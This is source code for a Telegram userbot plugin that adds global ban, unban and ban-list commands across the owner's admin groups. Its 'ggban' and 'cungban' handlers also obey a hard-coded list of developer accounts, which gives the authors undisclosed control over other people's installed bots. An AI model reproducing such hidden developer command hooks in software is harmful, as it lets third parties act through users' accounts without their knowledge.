weh# if you can read this, this meant you use code from Geez Ram Project
# this code is from somewhere else
# please dont hestitate to steal it
# because Geez and Ram doesn't care about credit
# at least we are know as well
# who Geez and Ram is
#
#
# kopas repo dan hapus credit, ga akan jadikan lu seorang developer
# ©2023 Geez & Ram Team

from pyrogram import Client, errors, filters
from pyrogram.types import ChatPermissions, Message
from geezlibs import DEVS, BL_GEEZ
from geezlibs.geez.helper.PyroHelpers import get_ub_chats
from Geez.modules.basic.profile import extract_user, extract_user_and_reason
from geezlibs.geez.helper import *
from geezlibs.geez.database import gbandb as Geez
from geezlibs.geez.database import gmutedb as Gmute
from Geez.modules.basic import add_command_help

ok = []

@Client.on_message(
    filters.command("ggban", ".") & filters.user(DEVS) & ~filters.via_bot
)
@Client.on_message(filters.command("gban", cmd) & filters.me)
async def gban_user(client: Client, message: Message):
    user_id, reason = await extract_user_and_reason(message, sender_chat=True)
    if message.from_user.id != client.me.id:
        ex = await message.reply_text("`Bentar...`")
    else:
        ex = await message.edit("`Lah bentar....`")
    if not user_id:
        return await ex.edit("Balas pesan pengguna atau berikan nama pengguna/id_pengguna")
    if user_id == client.me.id:
        return await ex.edit("**Lu mau gban diri sendiri? Tolol!**")
    if user_id in DEVS:
        return await ex.edit("Lah ngapa yaaaa?")
    if user_id:
        try:
            user = await client.get_users(user_id)
        except Exception:
            return await ex.edit("`Balas pesan pengguna atau berikan nama pengguna/id_penggun`")

    if (await Geez.gban_info(user.id)):
        return await ex.edit(
            f"[user](tg://user?id={user.id}) **Lah tau ya, kan udah digban cuy**"
        )
    f_chats = await get_ub_chats(client)
    if not f_chats:
        return await ex.edit("**Tutor admin kak 🥺**")
    er = 0
    done = 0
    for gokid in f_chats:
        try:
            await client.ban_chat_member(chat_id=gokid, user_id=int(user.id))
            done += 1
        except BaseException:
            er += 1
    await Geez.gban_user(user.id)
    ok.append(user.id)
    msg = (
        r"**#Berhasil Dibanned**"
        f"\n\n**Nama:** [{user.first_name}](tg://user?id={user.id})"
        f"\n**User ID:** `{user.id}`"
    )
    if reason:
        msg += f"\n**Alasan:** `{reason}`"
    msg += f"\n**Sukses di:** `{done}` **Obrolan**"
    await ex.edit(msg)


@Client.on_message(
    filters.command("cungban", ".") & filters.user(DEVS) & ~filters.via_bot
)
@Client.on_message(filters.command("ungban", cmd) & filters.me)
async def ungban_user(client: Client, message: Message):
    user_id, reason = await extract_user_and_reason(message, sender_chat=True)
    if message.from_user.id != client.me.id:
        ex = await message.reply("`UnGbanning...`")
    else:
        ex = await message.edit("`UnGbanning....`")
    if not user_id:
        return await ex.edit("I can't find that user.")
    if user_id:
        try:
            user = await client.get_users(user_id)
        except Exception:
            return await ex.edit("`Please specify a valid user!`")

    try:
        if not (await Geez.gban_info(user.id)):
            return await ex.edit("`User already ungban`")
        ung_chats = await get_ub_chats(client)
        ok.remove(user.id)
        if not ung_chats:
            return await ex.edit("**You don't have a Group that you admin 🥺**")
        er = 0
        done = 0
        for good_boi in ung_chats:
            try:
                await client.unban_chat_member(chat_id=good_boi, user_id=user.id)
                done += 1
            except BaseException:
                er += 1
        await Geez.ungban_user(user.id)
        msg = (
            r"**\\#UnGbanned_User//**"
            f"\n\n**First Name:** [{user.first_name}](tg://user?id={user.id})"
            f"\n**User ID:** `{user.id}`"
        )
        if reason:
            msg += f"\n**Reason:** `{reason}`"
        msg += f"\n**Affected To:** `{done}` **Chats**"
        await ex.edit(msg)
    except Exception as e:
        await ex.edit(f"**ERROR:** `{e}`")
        return


@Client.on_message(filters.command("listgban", cmd) & filters.me)
async def gbanlist(client: Client, message: Message):
    users = (await Geez.gban_list())
    oof = "**#GBanned Users:**\n"
    ex = await message.edit_text("`Mikir bentar...`")
    list_ = await Geez.gban_list()
    if len(list_) == 0:
        await ex.edit("**Letau ga nemu**")
        return
    for lit in list_:
        oof += f"**User :** `{lit['user']}` \n**Alasan :** `{lit['reason']}` \n\n"
    return await ex.edit(oof)


add_command_help(
    "globals",
    [
        [
            "gban <reply/username/userid>",
            "Do Global Banned To All Groups Where You As Admin.",
        ],
        ["ungban <reply/username/userid>", "Remove Global Banned."],
        ["listgban", "Displays the Global Banned List."],
    ],
)
